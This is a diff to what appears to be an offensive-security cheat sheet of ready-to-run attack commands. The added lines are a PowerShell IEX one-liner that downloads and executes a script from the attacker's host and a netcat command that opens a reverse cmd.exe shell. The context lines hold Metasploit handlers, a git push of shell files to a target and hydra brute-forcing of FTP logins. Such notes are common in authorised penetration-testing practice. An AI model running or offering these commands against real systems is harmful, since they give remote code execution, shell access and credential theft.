@@ -98,11 +98,10 @@ Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set LPORT 5555; set SRVHOST $MYIP; run"
 rlwrap msfconsole -q -x "use multi/handler; set LHOST $MYIP; set LPORT 5555; run"
 rlwrap nc -lvnp 5555
-python3 -m http.server 8080
 
-## MSHTA Payload
-mshta http://$MYIP:8080/nZzLAD.hta
-sessions -i 1
+## File Transfer
+python3 -m http.server 80 -d ~/Upload
+"powershell -c IEX (New-Object Net.WebClient).DownloadString(''http://$MYIP/tools.ps1'')"
 
 ## Sorting Files
 sort -u usernames | tee usernames
@@ -278,6 +277,9 @@ https://datafetcher.com/graphql-json-body-converter
 git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
 
 ## Infrastructure
+[*] Shells
+nc.exe $MYIP 5555 -e cmd.exe
+
 [*] (21) FTP
 hydra -L usernames -P passwords ftp://$TARGET -t35
 
